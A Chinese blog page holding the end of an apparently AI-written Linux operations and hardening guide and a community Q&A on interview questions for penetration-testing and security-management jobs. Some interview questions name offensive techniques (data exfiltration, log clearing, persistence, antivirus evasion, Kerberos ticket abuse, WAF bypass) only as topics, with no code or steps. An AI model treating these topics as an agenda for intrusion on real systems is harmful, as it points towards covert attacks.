-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CPU 利用率趋势（识别闲置机器）</span></span><br><span class="line">sar -u 1 86400 &gt; cpu_daily.log  <span class="comment"># 24 小时采样</span></span><br><span class="line">awk <span class="string">&#x27;&#123;sum+=$3&#125; END &#123;print sum/NR&#125;&#x27;</span> cpu_daily.log  <span class="comment"># 平均利用率</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存浪费检测（cache 过高可能需要调整应用）</span></span><br><span class="line">free -h | awk <span class="string">&#x27;/Mem:/ &#123;print $7/$2*100&quot;%&quot;&#125;&#x27;</span>  <span class="comment"># available 占比</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 磁盘增长速率（预测扩容时间）</span></span><br><span class="line"><span class="built_in">df</span> -h &gt; disk_$(<span class="built_in">date</span> +%Y%m%d).<span class="built_in">log</span></span><br><span class="line">diff disk_20240101.log disk_20240115.log</span><br></pre></td></tr></table></figure>
-
-<p>根据数据制定策略：CPU 平均 &lt;30% 考虑缩容，磁盘增长 &gt;5GB&#x2F;天 需扩容或清理日志，内存 available &lt;20% 需优化应用或加内存。</p>
-<h2 id="十、生产环境-Runbook-参考"><a href="#十、生产环境-Runbook-参考" class="headerlink" title="十、生产环境 Runbook 参考"></a>十、生产环境 Runbook 参考</h2><h3 id="10-1-应急响应检查清单"><a href="#10-1-应急响应检查清单" class="headerlink" title="10.1 应急响应检查清单"></a>10.1 应急响应检查清单</h3><p><strong>服务不可用（HTTP 502&#x2F;503）</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx  <span class="comment"># 服务状态</span></span><br><span class="line">ss -tlnp | grep :80     <span class="comment"># 端口监听</span></span><br><span class="line"><span class="built_in">tail</span> -100 /var/log/nginx/error.log  <span class="comment"># 错误日志</span></span><br><span class="line">ps aux | grep nginx     <span class="comment"># 进程存在性</span></span><br><span class="line">curl -I http://localhost  <span class="comment"># 本地连通性</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>CPU 100% 持续告警</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">top -b -n 1 | <span class="built_in">head</span> -20  <span class="comment"># 找出 Top 进程</span></span><br><span class="line">ps -eo pid,ppid,cmd,%cpu --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span> -10</span><br><span class="line">strace -p &lt;PID&gt; -c      <span class="comment"># 系统调用统计</span></span><br><span class="line">perf top -p &lt;PID&gt;       <span class="comment"># 热点函数（需安装 perf）</span></span><br><span class="line">jstack &lt;PID&gt; &gt; thread_dump.txt  <span class="comment"># Java 线程堆栈</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>磁盘空间满（100%）</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -h  <span class="comment"># 确认分区</span></span><br><span class="line"><span class="built_in">du</span> -sh /* | <span class="built_in">sort</span> -hr | <span class="built_in">head</span> -5  <span class="comment"># 找大目录</span></span><br><span class="line">lsof | grep deleted  <span class="comment"># 已删除但未释放的文件</span></span><br><span class="line">find /var/log -name <span class="string">&quot;*.log&quot;</span> -mtime +7 -delete  <span class="comment"># 清理旧日志</span></span><br><span class="line">journalctl --vacuum-time=7d  <span class="comment"># 清理 systemd 日志</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="10-2-常用命令速查"><a href="#10-2-常用命令速查" class="headerlink" title="10.2 常用命令速查"></a>10.2 常用命令速查</h3><p><strong>性能分析一键脚本</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== System Info ===&quot;</span> &amp;&amp; <span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Uptime ===&quot;</span> &amp;&amp; <span class="built_in">uptime</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Disk Usage ===&quot;</span> &amp;&amp; <span class="built_in">df</span> -hT</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Memory ===&quot;</span> &amp;&amp; free -h</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Top CPU ===&quot;</span> &amp;&amp; ps aux --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span> -5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Top Mem ===&quot;</span> &amp;&amp; ps aux --<span class="built_in">sort</span>=-%mem | <span class="built_in">head</span> -5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Network ===&quot;</span> &amp;&amp; ss -s</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== Listening Ports ===&quot;</span> &amp;&amp; ss -tlnp</span><br></pre></td></tr></table></figure>
-
-<p><strong>日志分析模板</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计 HTTP 状态码分布</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 IP 访问 Top 10</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | <span class="built_in">head</span> -10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算平均响应时间</span></span><br><span class="line">awk <span class="string">&#x27;&#123;sum+=$10; count++&#125; END &#123;print sum/count&#125;&#x27;</span> access.log</span><br></pre></td></tr></table></figure>
-
-<p><strong>网络诊断组合拳</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 完整连接链路测试</span></span><br><span class="line">ping -c 3 &lt;target&gt; &amp;&amp; \</span><br><span class="line">traceroute -n &lt;target&gt; &amp;&amp; \</span><br><span class="line">curl -o /dev/null -s -w <span class="string">&quot;HTTP: %&#123;http_code&#125;, Time: %&#123;time_total&#125;s\n&quot;</span> http://&lt;target&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="10-3-安全加固检查"><a href="#10-3-安全加固检查" class="headerlink" title="10.3 安全加固检查"></a>10.3 安全加固检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查 SUID 文件（潜在提权风险）</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 审计定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查开放端口（最小化暴露）</span></span><br><span class="line">ss -tlnp | awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span> | grep -oE <span class="string">&#x27;[0-9]+$&#x27;</span> | <span class="built_in">sort</span> -u</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码策略检查</span></span><br><span class="line">chage -l &lt;username&gt;  <span class="comment"># 密码过期时间</span></span><br><span class="line"><span class="built_in">cat</span> /etc/login.defs | grep PASS  <span class="comment"># 密码复杂度要求</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><strong>关键要点总结</strong>：</p>
-<ol>
-<li><strong>只读优先</strong>：所有诊断从 <code>ps</code>&#x2F;<code>top</code>&#x2F;<code>df</code>&#x2F;<code>ss</code> 等只读命令开始，避免误操作</li>
-<li><strong>备份强制</strong>：任何 <code>-i</code> 参数（<code>sed -i</code>&#x2F;<code>rm -i</code>）操作前必须备份，保留时间戳</li>
-<li><strong>分层验证</strong>：网络问题从 ICMP → TCP → HTTP 逐层测试，进程问题从状态 → 资源 → 调用链分析</li>
-<li><strong>自动化优先</strong>：重复性检查写成脚本，集成到 CI&#x2F;CD 和监控告警</li>
-<li><strong>权限最小化</strong>：生产环境禁止 <code>chmod 777</code>，使用 ACL 和专用服务账户</li>
-</ol>
-<p>本指南覆盖 90% 日常运维场景，复杂问题（内核 panic、文件系统损坏）需结合 <code>strace</code>&#x2F;<code>perf</code>&#x2F;<code>crash</code> 等高级工具，建议建立团队知识库持续积累案例。</p>
-<hr>
-<p><em>by claude-sonnet-5 nightly expand · 2026-09-19</em></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/pantesting-interview/">
-                渗透 面试题
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/面试/">面试</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <ul>
-<li>问：<br>录了多少洞. 自研了多少工具. 擅长什么类型语言，跟挖洞逻辑。</li>
-</ul>
-<p>问：</p>
-<ol>
-<li>怎么找入口</li>
-<li>怎么拖数据</li>
-<li>怎么清日志</li>
-<li>怎么长期隐藏</li>
-</ol>
-<p>问：<br>老三套，问出身. 问证书. 问经验。然后开放题或者从某个经验着手往下挖，最后让自述一下印象最深刻的一次。基本就差不多了。</p>
-<p>问：<br>外部的，就是各种白帽子活动等<br>内部的，就是扫描工具管理和漏洞修复流程等</p>
-<p>问：<br>外部的，就是各种白帽子活动等<br>内部的，就是扫描工具管理和漏洞修复流程等</p>
-<p>问：<br>水平较低：常用工具和常用工具的命令或者工具魔改<br>水平适中：渗透流程简述，最擅长的阶段展开讲述案例和技术特点<br>水平较高：绕过. 免杀. 逃逸. 技术细节<br>水平顶尖：AI 在安全的应用并且算法细节原理</p>
-<p>问：</p>
-<ol>
-<li>介绍比较得意的渗透项目</li>
-<li>从Top10里找几个问原理和修复方法</li>
-<li>常用的工具，还有工具的bug</li>
-<li>遇到复杂漏洞的时候怎么做，举个例子</li>
-<li>如何跟踪最新的漏洞和技术</li>
-</ol>
-<p>问：<br>常规TOP10肯定问一圈了，然后问了一两个案例吧，如果案例都说的挺好，就会问个自己感兴趣的，我喜欢提问Random函数真的随机吗，真假随机数的问题。</p>
-<p>问：<br>讲讲你的渗透测试思路，你认为当前网络安全领域的最大威胁是什么？你如何保持对最新安全漏洞和攻击技术的了解？请分享你过去的一个渗透测试项目经验，包括遇到的挑战和解决方案。如何处理客户在渗透测试后对报告的反馈？</p>
-<p>A9：</p>
-<ol>
-<li>提供一个网站，请给出渗透的思路</li>
-<li>假设发现了这些漏洞，请问原理是怎么样子的，如何进一步扩大成果</li>
-<li>针对这些漏洞，请问对应的修复方案是怎么样子的</li>
-<li>列出常用的渗透测试工具，比如？</li>
-<li>根据之前的渗透观察，请给出这个网站大概的架构是怎么样子的，网络怎么走，使用了哪些第三方的依赖？</li>
-</ol>
-<p>A10：</p>
-<ol>
-<li>搭建靶机环境直接实践</li>
-<li>常见的免杀思路及免杀方法</li>
-<li>内网渗透常用的工具使用方法，以及常见的提权漏洞编号及原理</li>
-<li>常见的高交互蜜罐如何识别</li>
-<li>内网渗透，横向移动的若干方法，AD域的黄金作用和白银票据作用，如何获取并利用</li>
-</ol>
-<p>A11：</p>
-<ol>
-<li>直接上实操环境考察</li>
-<li>问一下对方全流程是什么，主要考察一些意识，比如是否获得授权等等。现在有些培训班会交一些面试的话术的，如果不是专业人员来面试，很可能糊弄过去了。</li>
-</ol>
-<p>A12：<br>问测试思路. 问漏洞原理（刨根问底的那种），看证书这类客观的证明，再拿一个自己单位渗透测试过程中遇到过的问题，问他遇到了会怎么处理，结合他岗位以后干什么级别的渗透了，问漏洞成因. 攻击原理，这样就能排除培训班. 混子了。问原理直接问到红温，知识储备+抗压表现都能考察到。</p>
-<p>A13：<br>说实话，就是不要理论要实战，不要面什么 SQL注入有几种分类. 延迟注入BULL注入有什么区别之类的。直接问有没有在其它SRC提过SQL注入，现在常用的工具，你会去什么地方找POC。渗透流程套路式回答大家都会，最好还是拿出几行漏洞代码实战解读下。</p>
-<p>A14：<br>其实我觉得场景面试更加能够判断面试者的能力，开放性场景面试招的几个兄弟都不错。有没有实战能力，通过场景就可以看出来。当然具体还是看岗位的实际要求。比如安服跟自研所需的能力就不一样。开放性场景面试可以考察面试者的功力和知识深度。很多速成的兄弟对原理和知识点和横向移动这些还是比较弱的。</p>
-<p>A15：<br>就甲方面试而言，主要提升企业安全风险管理</p>
-<ol>
-<li>如何确保渗透测试时不会对业务和系统影响</li>
-<li>如何做好漏洞生命周期管理</li>
-</ol>
-<p>A16：<br>甲方里做渗透，一方面是挖洞能力，一方面还有推动漏洞修复的沟通协调能力。</p>
-<p>A17：<br>如果面试的是甲方岗位：<br>问题1：说一下你印象最深刻的一次渗透经历；<br>问题2：你觉得甲方岗位具备的渗透能力；<br>问题3：针对无WEB界面的系统如何进行渗透；<br>问题4：说一下XXX组件漏洞的分析过程。</p>
-<p>A18：</p>
-<p>从甲方的角度，渗透的一个重要点就是需要和开发打交道，明确漏洞原理以及如何修复的。</p>
-<p>那么一是漏洞的原理（从代码层面来讲）；二是给一个符合本公司的业务场景，让对方分析下可能出现哪些逻辑漏洞，如何修复因业务处理逻辑问题产生的漏洞（这块可以考察对方的思维逻辑）；三是漏洞修复的思路（这点可以考察对代码的功能和逻辑的实现的熟悉情况）。</p>
-<p>渗透测试的思路还是需要问一下的，这个是门槛了。思路逻辑都说不清楚的，直接就pass了。</p>
-<p>渗透测试不是攻防，其实不需要太多社会工程的，要是熟练用社会工程学的，那么就是加分项。</p>
-<p>A19：</p>
-<p>鄙人拙见：如果是甲方面试安全岗位人员，一般会从理论水平和实践经验. 实操能力. 心里素质等多方面考察面试者。理论水平可以提前参考专业证书. 专业试题. 前沿技术热点等考察或测试；实践经验主要看既往的项目执行情况&#x2F;安全管理运营情况，以及从中总结出的经验和教训；实操能力可以通过威胁建模. 渗透测试. 代码审计. 应急响应等方面的技术细节来提问；心理素质则可以通过心理分析类题目. 面试中设置“向领导汇报安全问题“. “沟通协调强势部门整改”等场景化问题来考察面试者是否能从容应对。</p>
-<p>Q：面试安全管理岗位，作为面试官，你觉得提问什么问题可以比较好地考察面试者的水平？<br>A20：</p>
-<ol>
-<li>如果公司有一个project要上线，你会怎么开展风险评估并给出建议？</li>
-<li>了解安全成熟度吗？</li>
-<li>刚进入一家公司工作，是如何做安全规划的？</li>
-</ol>
-<p>之前面试被问过的，也算经典问题。</p>
-<p>A21：</p>
-<ol>
-<li>如何展示业绩达成</li>
-<li>如何申请资源和投入产出收益</li>
-<li>如何向上管理</li>
-<li>如何与业务老大激烈沟通</li>
-</ol>
-<p>A22：</p>
-<p>我遇到过的问题，如果会议上你老板说的话从你的视角来看有很大的安全认知上的错误，你会怎么做？</p>
-<p>A23：</p>
-<p>直接问怎样保住安全团队？安全建设思路. 理念等等，看他整体框架怎么样。</p>
-<p>A24：</p>
-<p>描述你如何制定和实施一个全面的信息安全管理体系（ISMS），包括风险评估. 政策制定. 技术措施. 人员培训和持续改进等方面。在这个过程中，你会面临哪些挑战，以及你将如何应对这些挑战？</p>
-<p>A25：</p>
-<p>常规的先让他介绍下熟悉哪些标准&#x2F;法律，就职的公司有哪些认证，在公司取得270001&#x2F;等时他从事哪些角色，做了哪些，另外就是安全部门如何驱动IT及业务落地安全。</p>
-<p>A26：</p>
-<p>关注一下被面试者对前面业务的理解以及这个业务最大的风险点。以前遇到的最困难的场景以及解决的方法。可以看出他的风险偏好以及沟通协调能力。</p>
-<p>A27：</p>
-<p>这个我会完全围绕上一家来问，问他上家公司的规模，他所在的团队，他进去的时候是多少人，离开的时候是多少人，为什么，中间发生了什么变化，他遇到了什么问题，解决了什么问题，听听他的思考，管理岗我是觉得没有套路，主要看脾气与队伍是否合适。</p>
-<p>A28：</p>
-<p>假设你来给公司从0开始做安全，你会怎么做， 讲述一下SDL建设流程，讲述一下SDL和DevSecOps的区别，等保和ISO27001的区别，说一下你知道的安全模型，有哪些优点和缺点，还有就是问，国内针对网络安全相关的法律有哪些？如果业务涉及国外就问国外体系，比如你对硅谷的安全公司和咨询公司有什么了解？</p>
-<p>A29：</p>
-<ol>
-<li>看看他对合规的理解，尤其是ZZ觉悟和立场</li>
-<li>看看他的理解重点，是在网络层. 数据层. 应用层. 开发层. 架构层. 业务层还是合规层</li>
-<li>看看他的重点方向是偏哪个方面：技术？管理？控制？合规？隐私保护？个人信息保护？跨境保护？</li>
-<li>看看他擅长的技术领域：开发？控制？执行？规划？设计?审计？</li>
-<li>合规方面，看他的认知：只知道等保或27001加1分，等保+27001都了解 加2分，叠加个保加3分，叠加跨境加4分，叠加其他国家法律法规认知的，每了解一个加1</li>
-<li>他对安全运营的的理解，重点考察他的认知层级（网络层. 数据层. 应用层. 开发层. 架构层）</li>
-</ol>
-<p>A30：</p>
-<p>可以从宏观和微观两个角度考虑：</p>
-<ol>
-<li>宏观看体系思维：作为甲方安全管理岗位，请面试者站在企业整体安全角度考虑，结合外部监管要求和公司业务发展情况，描述一下如何建立建立本企业的网络安全体系，包含实施简要的实施路径等。</li>
-<li>微观看技术细节：结合当前企业安全痛点，请面试者给出解决方案，比如企业最近钓鱼邮件比较多，如何做好相关防范工作；进而对其中一些技术细节，比如SPF. DKIM. DMARC. RDNS等概念和如何实施进行提问等。</li>
-</ol>
-<p>A31：<br>我面试人也不看技术，我看这个人：</p>
-<ol>
-<li>有没有学习欲望，有没有学习能力和动力</li>
-<li>懒不懒</li>
-<li>蠢不蠢</li>
-<li>闷不闷（口才沟通）</li>
-<li>能否控制情绪</li>
-<li>整体认知</li>
-</ol>
-<p>如果有2. 3. 4，直接PASS。</p>
-<p>A32：<br>我一般会问最近安全行业发生了什么事，这件事发生在你这里，如何应对，行业其他公司怎么做的。然后一部分人不知道，一部分人只知道表面，能知道其他公司咋做的，已经是佼佼者了。打一下盲区，基本技术是下面部门经理的事，我主要看认知，问加班强度的，都直接否了。闷葫芦也是致命弱点。</p>
-<p>A33：<br>对着他写的简历问，讲的都是头头是道的，问一下细节不会的基本就可以刷了。如果细节都讲出来，能说明他做过就行了，面试不大可能招完全match需求的人，成功做过1~2件事的人上手新事情成功的概率也是相对高一些的。</p>
-<p>Q：作为面试者，你遇到过哪些比较“奇葩的”面试题目？<br>A34：<br>如果你是黑客，怎么攻击我们公司。</p>
-<p>A35：<br>当你入职以后，怎么融入团队？我当时差点笑出来。</p>
-<p>A36：<br>某企业，群面要求15分钟，开放性题目10个人达成统一意见，不允许投票。</p>
-<p>A37：<br>我们这边比较闲，可以接受嘛？</p>
-<p>A38：<br>网线里面有几根双绞线，怎么排列的</p>
-<p>A39：<br>能不能接受轮班或7*24接电话</p>
-<p>A40：<br>其实心理测试还是很有必要的，防止有些人情绪比较极端，不好配合。测的就是你面对奇葩题目的时候是否冷静，我们还真有因为心理测验分数太低不予通过的。</p>
-<p>A41：<br>你写这些项目经历对我没用啊，你水平不行很垃圾，这样我这里还有一个外地驻场的名额，请问你愿意去外地驻场么？</p>
-<p>A42：<br>我有遇到过直接问我，你为什么觉得自己值这么多钱？</p>
-<p>A43：<br>当时我说可以用AI对抗WAF防护。面试官逐个厂商问哪家被绕过，面试还有录屏录音。不说详细感觉在吹牛逼，说详细又有录音录屏。你们说咋办？</p>
-<p>A44：<br>你的本地电脑，访问百度，中间涉及到的任何IT技术，全部阐述一次。这种一般是问经典的dns解析过程，但所有细节就太扯了。</p>
-<p>A45：<br>面过某安全厂商，问我如果有个组件存在某个漏洞，但是没有POC，怎么确定POC是什么?<br>答: 可以对比更新代码或者知道大概细节的话用模糊测试。</p>
-<p>面试官: 你这个不对</p>
-<p>答: 那你们是怎么确定的？</p>
-<p>面试官: 我们给服务器发送一个数据包，通过判断页面返回码判断有没有漏洞。</p>
-<p>A46：<br>还做公务员考试的题目呢，类似这样的↓</p>
-<p>A47：<br>十年前我去IBM面试的时候，遇到这种题目，还TM五张卷子，全英文！</p>
-<p>A48：<br>面试没怎么问技术，就问所有的安全类工作你能不能干，能干就进入下个环节谈工资，领导直接说他不懂技术，老板家的亲戚，来搞钱的，我其实觉得这种领导是很好搭伙的，但是在谈工资的时候让我大吃一鲸，要求全能，但是工资给8K……我说HR跟我说的不是这个数，领导说他说了算，他还暗示了可以搞项目赚钱，但是我不太信，他很直白，说是老板的小舅子，创建这个部门就是为了赚钱的，他说相信我能帮他赚钱，还可以让我喝汤，但是我不敢信。</p>
-<p>Q：作为面试者，在面试官提问“你有什么想问的”的时候，应该怎么问？<br>A49：<br>你希望我入职后，为公司做什么？</p>
-<p>A50：<br>直接问公司的人员流动性高吗，中年员工占比多少？</p>
-<p>A51：<br>有什么内部培训？考证可以报销吗？</p>
-<p>A52：<br>把面试官提出来的某些问题反问一下。</p>
-<p>A53：<br>刺探一下这个企业经营状况如何，避免试用期就裁员。</p>
-<p>A54：<br>出重大安全事件, 给咱们公司主动顶包有补偿吗?</p>
-<p>A55：<br>贵公司安全预算每年大概是多少，和业务的占比是什么样的，安全团队的人员构成是什么样的？</p>
-<p>还有网络安全公司&#x2F;集团组织架构中的位置是什么样的，网络安全团队负责任的直属上司是谁？</p>
-<p>A56：<br>安全人员有几个，如何分工，目前安全建设处于什么阶段，是否翻过车，为什么突然找人搞安全？</p>
-<p>A57：<br>我都问部门文化是偏向团体合作还是孤狼型的？有把握就问，如何看待员工的未來发展？</p>
-<p>A58：<br>多久调薪，现在的同事都是工作几年？目前贵司对信息安全认为最应该改善是哪方面？原先的信息安全建设情况如何，最大的阻力是哪一方？没有半年，就问：是什么动力支撑你们还在公司呢？</p>
-<p>A59：<br>描述一下你工作这几年来对这家公司的印象，你对你现在的工作满意吗？如果面试过程不顺利，可以问问，让对方陷入自我怀疑。</p>
-<p>A60：<br>面试官，如果你现在我这个角度，面对这个问题，你会问哪些方面？</p>
-<p>A61：<br>只要基于掌握的信息，提出与工作相关的合理问题即可，这个问题不要太过俗套，当然也不能太难，要在一个合理范围内，这个具体就需要候选人自己把控了。</p>
-<p>A62：<br>我一般会想了解面试岗位的地位. 环境等具体情况：比如安全团队在公司组织架构中的位置，有多少人. 如何分工，向谁汇报；安全预算有多少，主要项目规模有多大；面试岗位的日常工作内容. 技术要求；岗位的薪资. 福利等。我觉得上述问题可以直接问，也希望面试官直接回答。</p>
-<p>A63：<br>大领导， 就问安全理念. 安全文化和后续公司层面的安全建设方向；直属领导，就问这个岗位空出来原因，团队组成和分工，岗位绩效考核标准；谈薪资的领导，就问公司人员流动情况，最近有无裁员情况等等和个人利益相关的。</p>
-<p>A64：<br>面某互联网金融公司的时候，面试官说脉脉上说的关于我们公司加班文化都太夸张了，我就问了这周六你们上班吗，然后就没有然后了。</p>
-<p>A65：<br>人家不想要你，问题再犀利也没用，想要你，基本都私下谈好，面试走个过场的。</p>
-<p>Q：大家作为面试者或面试官的过程中，有哪些好的面试方法？<br>A66：<br>查下公司发展情况，准备倒闭的就别去面试了。查下CIO. CTO. CSO等IT管理者的背景。</p>
-<p>A67：<br>放松心态，睡个好觉；面试时注意语速；多观察下面试官的情绪波动。</p>
-<p>A68：<br>咖啡厅，朋友一般的聊聊天，然后探讨，由浅入深。</p>
-<p>A69：<br>偏技术的岗位，可以考虑在具备靶场或模拟机的环境下，实操一些技术题目；偏管理的岗位，还是传统的面对面的沟通方式。</p>
-<p>A70：<br>加候选人微信，从朋友圈获得一些信息。</p>
-<p>A71：<br>尽量不开摄像头，面试状态就会好很多。</p>
-<p>A72：<br>作为面试者，在面试前通过情报资源搜索公司的详细资料，通过岗位的详细介绍可以大概知道这个岗位今后的工作内容，最后将获得的资料整理成一个工作步骤和一个简易的报告，在面试的时候和面试官探讨这个报告。</p>
-<p>A73：<br>曾经作为面试官，问面试者为什么想来我们公司，面试的人说，你们公司工资高，我问，你怎么知道的，面试者说，他通过公积金系统查到的。面试结束。</p>
-<p>A74：<br>我觉得，就当聊天的感觉最好，毕竟各有所长，最恶心那种快问快答的。</p>
-<p>A75：<br>赞同，比如面试官让你介绍一下做过项目以及碰到的问题和解决思路。你一顿说，说完之后，面试官直接说，好，面试结束，进入下个环节，这种大家怎么看。</p>
-<p>A76：<br>我遇到过，面试官准备了一堆八股文，上去就跟我说，咱们快问快答……</p>
-<p>A77：<br>我面试别人一般是分成两部分，盘海底和自由发挥。盘海底能够快速省力地判断出对方的大致水平以及有没有触雷点，自由发挥就是让被面试者自由说一些经验较深的场景来判断对方的深度。我基本面别人都是这两个环节。</p>
-<p>也碰到过一些面试官喜欢搞一道题式问答，我很不喜欢这种——“你能回答出这个就算通过了”。都是预设了答案的问题。</p>
-<p>我记得很久以前面渗透岗时候，对面问了个蜜罐的问题，说有些蜜罐能通过JS抓到你的原始IP，挂代理也没用，这是怎么做到的。我当时白眼都要翻上天了，这什么天顶星JS，怎么不说访问下网站直接我电脑弹计算器了？跳板机CS上线一条龙？风险管理我们一般是参考27001的那一套风险脆弱性评估的。这就是一种非常特化的场景，需要非常谨慎地构建前提条件，但是在面试里很容易就是一句直接过去，无视掉所有条件，这种半桶水式的面试是我非常不喜欢的。</p>
-<p>我后面想估计是想问我什么蜜罐方面的新技术或者一些蜜罐的原理，但是这个问法就是一种非常半桶水的感觉。</p>
-<p>以前面另一个甲方岗时候感觉他们的架构有问题，当时不懂事，就反问了下，为什么不用xxxxx这种更合理的逻辑，然后把对面问愣了，明显面子挂不住开始找理由。</p>
-<p>现在这种话都会说得委婉一点了。</p>
-<p>本期话题探讨了在网络安全领域中，针对渗透测试岗位与安全管理岗位面试时的一些考察方法及问题。对于渗透测试岗位，面试官倾向于通过实践操作来检验应聘者的实战能力，例如让他们在一个模拟环境中进行渗透测试，或是提问具体的漏洞利用技术和修复方案。此外，也会考察应聘者对于漏洞原理的理解、常用工具的掌握程度以及在特定场景下的问题解决能力。</p>
-<p>而在安全管理岗位的面试中，则更多关注应聘者的理论水平、实践经验、实操能力和心理素质等方面。面试官可能会问及如何构建全面的信息安全管理体系(ISMS)，包括风险评估、政策制定等内容，并探讨应聘者在过去工作中遇到的具体挑战及其解决方案。此外，还会考察应聘者对于法律法规的认知、安全团队的建设和管理等综合能力。</p>
-<p>两者的面试都强调了应聘者不仅要具备扎实的技术基础，还需要拥有良好的沟通协调能力，以便于在实际工作中与不同部门协作，推进安全项目的实施。</p>
-<p>近期群内答疑解惑<br>Q：员工离职以后电脑数据要清理吗?<br>A1：<br>要，入库前重装系统，全盘格式化。</p>
-<p>A2：<br>需要重装吗？直接格式化就完了。</p>
-<p>A3：<br>可以不全盘，删账号也可以的，格式化非系统盘。</p>
-<p>A4：<br>看他数据后续业务是否需要使用。使用-备份到服务器，再重装系统。</p>
-<p>A5：<br>这个得看员工级别，以及在岗时间老实不老实了，要是重点观察的员工要保留一段时间。其实主要看你的领导有没有疑心病什么的。</p>
-<p>A6：<br>这信息安全工作越干越具体，直接把IT部门网管都顶替了。</p>
-<p>Q：安全产品要给IT开权限么？基础设施运维的，比方说上网行为、管理。<br>A1：<br>如果是不同部门，那就让他邮件给你领导，你领导同意就行。</p>
-<p>A2：<br>防病毒和行为管理可以给，DLP的运维可以安装客户端，其他的用户权限控制走流程申请即可，还有一个准入的安装可以给，但是ACL需要走流程。</p>
-<p>A3：<br>如果他们拿了这些权限有什么用？帮忙干活对吧。</p>
-<p>A4：<br>防病毒很烦，那些人动不动装软件就杀，你给运维能减轻你工作量。不然呢，你还靠他们来审计吗？所以涉及基础的操作的都给运维，信息安全负责审计就得了。</p>
-<p>Q：求教企业数据安全的管理方案，目前实现的管控，和老板目视化的要求差的太多了。<br>涉及数据的分类分组，业务及系统Matrix形成分析，数据库访问记录形成分析，员工行为分析。<br>1、理论方面文件已有：数据安全治理的各种方案&#x2F;框架，数据采集、数据传输、数据存储、数据处理、数据交换和数据销毁<br>2、目前已有基本的管理：终端桌管、文件透明加密、ACL、上网行为管理、https、备份<br>A1：<br>可以参考一下数据安全管理办法，编写自己的管理制度。</p>
-<p>A2：<br>个人觉得，把问题抛给供应商，根据已有条件，看能否形成一定的解决方案。</p>
-<p>A3：<br>你这个需求是要做一个数据安全咨询服务，那找厂商吧。</p>
